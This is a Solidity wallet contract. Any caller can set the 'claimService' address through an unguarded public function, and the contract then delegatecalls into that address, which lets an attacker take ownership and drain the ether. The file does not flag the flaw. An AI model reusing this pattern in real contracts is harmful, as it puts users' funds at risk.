// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract EtherWallet {
    address payable public owner;
    address public claimAddress;
       address claimService;

    event ResponseInit(bool success_, bytes data_);
    event ResponseClaim(bool success, bytes data);

    constructor() {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function withdraw(uint256 _amount) external {
        require(msg.sender == owner, "caller is not owner");
        payable(msg.sender).transfer(_amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    
    function initializeClaimService(address _claimAddress) public {
        claimService = _claimAddress;
    }

    function order() public {
        (bool success, bytes memory data) = claimService.delegatecall(
            abi.encodeWithSignature("createOrder()")
        );
        emit ResponseInit(success, data);
    }

    function claim(
        bytes32 OrderId,
        address[] memory users,
        uint256 blockNumber
    ) public payable {
        (bool success, bytes memory data) = claimService.delegatecall(
            abi.encodeWithSignature(
                "claim(bytes32,address[],uint256)",
                OrderId,
                users,
                blockNumber
            )
        );
        emit ResponseClaim(success, data);
    }
}
